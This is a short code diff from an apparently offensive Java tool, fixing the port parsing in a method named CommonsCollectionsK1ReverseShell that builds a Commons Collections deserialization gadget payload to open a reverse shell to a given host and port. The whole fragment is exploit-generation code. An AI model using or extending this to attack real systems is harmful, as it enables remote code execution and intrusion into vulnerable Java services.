@@ -49,7 +49,7 @@ public class DeserializeController implements Controller {
     public byte[] CommonsCollectionsK1ReverseShell(String host, String port) throws Exception {
         System.out.println("[Deserialize] [CommonsCollectionsK1] [ReverseShell] Host: " + host + " Port: " + port);
 
-        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt("port"));
+        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
         byte[] data = CommonsCollectionsK1.create(templatesImpl);
         return data;
     }
